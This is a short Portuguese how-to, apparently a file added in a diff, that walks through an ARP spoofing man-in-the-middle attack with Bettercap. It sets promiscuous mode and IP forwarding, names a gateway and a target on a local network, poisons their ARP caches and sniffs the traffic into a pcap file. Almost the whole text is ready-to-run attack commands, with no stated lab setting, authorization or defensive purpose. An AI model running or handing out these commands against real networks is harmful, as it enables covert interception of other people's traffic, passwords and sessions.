@@ -1,0 +1,47 @@
+Ativar o modo promíscuo
+
+sudo ip link set eth0 promisc on
+
+
+
+Habilitar o IP Forwarding: 1
+
+sudo sysctl -w net.ipv4.ip_forward=1
+
+
+Iniciar o Bettercap
+
+Abra o Bettercap com a interface de rede desejada
+
+sudo bettercap -iface eth0
+
+
+Defina o gateway e o alvo para o ARP spoofing
+                      gateway     ipv4
+set arp.spoof.targets 192.168.0.1,192.168.0.3
+
+
+Iniciar a Captura de Pacotes
+
+set net.sniff.output capture.pcap
+net.sniff on
+
+
+Verificar o status do ARP Spoofing
+
+Para verificar se o ARP spoofing está ativo, você pode usar o comando
+
+show arp.spoof
+
+
+Iniciar o ARP Spoofing
+
+Agora, ative o ARP spoofing com o comando
+arp.spoof on
+
+
+
+Parar a Captura e o ARP Spoofing
+arp.spoof off
+net.sniff off
+
